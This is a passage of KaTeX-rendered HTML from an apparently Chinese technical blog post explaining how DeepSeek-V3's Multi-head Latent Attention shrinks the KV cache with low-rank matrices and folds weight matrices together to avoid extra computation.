xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>W</mi><mrow><mi>K</mi><mi>R</mi></mrow></msup></mrow><annotation encoding="application/x-tex">W^{KR}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span></span></span></span></span></span></span></span></span> 是 (7168, 64)，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>W</mi><mrow><mi>U</mi><mi>K</mi></mrow></msup></mrow><annotation encoding="application/x-tex">W^{UK}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">U</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span></span></span></span></span></span></span></span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>W</mi><mrow><mi>U</mi><mi>V</mi></mrow></msup></mrow><annotation encoding="application/x-tex">W^{UV}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">U</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span></span></span></span></span></span></span></span></span></span></span></span> 都是 (512, 128x128) 大小的，因此总共可以节省 94.1%。</p><h3 id="将一个大矩阵替换成两个低秩矩阵，如何能降低-KV-Cache-容量，节约了多少缓存容量？">将一个大矩阵替换成两个低秩矩阵，如何能降低 KV Cache 容量，节约了多少缓存容量？</h3><p>答：传统 attn 机制中，要存放到 KV cache 大小有 2 x num kv heads x head dim x sizeof(dtype)。而在 MLP 中，要存放的 KV cache 大小被缩减为了 dim x sizeof(dtype) 大小。</p><p>就拿 deepseek-v3 为例，如果使用传统的 attn 机制，那么每个 token 每一层需要占用 2 x 128 x 192 x sizeof(dtype) = 49152 Bytes，而 MLA 下每个 token 每一层仅需要 576 Bytes。节约了将近 98.8% 的 KV cache。</p><p><img src="/img/LLM/mla_kvcache.png" alt=""></p><h3 id="使用两个低秩矩阵是否会导致计算变多变慢？">使用两个低秩矩阵是否会导致计算变多变慢？</h3><p>答：不会，可以通过一些巧妙的数据公式推导，将很多权重的计算合并为一个。下面具体解释一下操作。</p><p>先来回顾上面的公式（4）和（5）：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">{</mo><msubsup><mi>k</mi><mi>t</mi><mi>C</mi></msubsup><mo separator="true">,</mo><msubsup><mi>k</mi><mi>t</mi><mi>R</mi></msubsup><mo stretchy="false">}</mo><mo>=</mo><mo stretchy="false">{</mo><msup><mi>W</mi><mrow><mi>U</mi><mi>K</mi></mrow></msup><msubsup><mi>c</mi><mi>t</mi><mrow><mi>K</mi><mi>V</mi></mrow></msubsup><mo separator="true">,</mo><mi mathvariant="normal">RoPE</mi><mo>⁡</mo><mo stretchy="false">(</mo><msup><mi>W</mi><mrow><mi>K</mi><mi>R</mi></mrow></msup><msub><mi>h</mi><mi>t</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{k^C_t, k^R_t\}=\{W^{UK}c^{KV}_t,\operatorname{RoPE}(W^{KR}h_t)\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1413em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.453em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">C</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.453em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mclose">}</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1413em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">U</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mord mathrm">RoPE</span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)}</span></span></span></span></span></p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msubsup><mi>v</mi><mi>t</mi><mi>C</mi></msubsup><mo>=</mo><msup><mi>W</mi><mrow><mi>U</mi><mi>V</mi></mrow></msup><msubsup><mi>c</mi><mi>t</mi><mrow><mi>K</mi><mi>V</mi></mrow></msubsup></mrow><annotation encoding="application/x-tex">v^C_t=W^{UV}c^{KV}_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1383em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.453em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">C</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1383em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">U</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span></span></p><p>当我们缓存了 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>c</mi><mi>t</mi><mrow><mi>K</mi><mi>V</mi></mrow></msubsup></mrow><annotation encoding="application/x-tex">c^{KV}_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0883em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span> 后，从上面公式看，似乎我们在每次推理的时候都必须重新计算 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>k</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">k_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">v_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。但其实不然，这些计算可以在计算 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>q</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>i</mi></mrow><mi>T</mi></msubsup><msub><mi>k</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>i</mi></mrow></msub></mrow><annotation encoding="application/x-tex">q^T_{t,i}k_{t,i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2361em;vertical-align:-0.3948em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-2.4413em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3948em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 时被合并起来，最终效果就是我们并不需要显式的计算出 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>k</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>i</mi></mrow></msub></mrow><annotation encoding="application/x-tex">k_{t,i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>i</mi></mrow></msub></mrow><annotation encoding="application/x-tex">v_{t,i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>，只需要将公式（1）和公式（4）代入到公式（6）的，再整理一下即可：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><msup><msubsup><mi>q</mi><mi>t</mi><mi>C</mi></msubsup><mi>T</mi></msup><msubsup><mi>k</mi><mi>t</mi><mi>C</mi></msubsup><mo>=</mo><mo stretchy="false">(</mo><msup><mi>W</mi><mrow><mi>U</mi><mi>Q</mi></mrow></msup><msubsup><mi>c</mi><mi>t</mi><mi>Q</mi></msubsup><msup><mo stretchy="false">)</mo><mi>T</mi></msup><msup><mi>W</mi><mrow><mi>U</mi><mi>K</mi></mrow></msup><msubsup><mi>c</mi><mi>t</mi><mrow><mi>K</mi><mi>V</mi></mrow></msubsup><mo>=</mo><msup><msubsup><mi>c</mi><mi>t</mi><mi>Q</mi></msubsup><mi>T</mi></msup><msup><mrow><mo stretchy="false">(</mo><msup><mi>W</mi><mrow><mi>U</mi><mi>Q</mi></mrow></msup><mo stretchy="false">)</mo></mrow><mi>T</mi></msup><msup><mi>W</mi><mrow><mi>U</mi><mi>K</mi></mrow></msup><msubsup><mi>c</mi><mi>t</mi><mrow><mi>K</mi><mi>V</mi></mrow></msubsup><mo>=</mo><msup><msubsup><mi>c</mi><mi>t</mi><mi>Q</mi></msubsup><mi>T</mi></msup><mi>W</mi><msubsup><mi>c</mi><mi>t</mi><mrow><mi>K</mi><mi>V</mi></mrow></msubsup></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(8)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">{q^C_t}^Tk^C_t=(W^{UQ}c^Q_t)^TW^{UK}c^{KV}_t={c^Q_t}^T{(W^{UQ})}^TW^{UK}c^{KV}_t={c^Q_t}^TWc^{KV}_t \tag{8}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.3696em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.453em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">C</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.1226em;"><span style="top:-3.3442em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.453em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">C</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.2092em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">U</span><span class="mord mathnormal mtight">Q</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9592em;"><span style="top:-2.4542em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">Q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2458em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">U</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.4405em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9592em;"><span style="top:-2.4542em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">Q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2458em;"><span></span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.1905em;"><span style="top:-3.4121em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord"><span class="mord"><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">U</span><span class="mord mathnormal mtight">Q</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.1226em;"><span style="top:-3.3442em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">U</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.4375em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9592em;"><span style="top:-2.4542em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">Q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2458em;"><span></span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.1905em;"><span style="top:-3.4121em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span 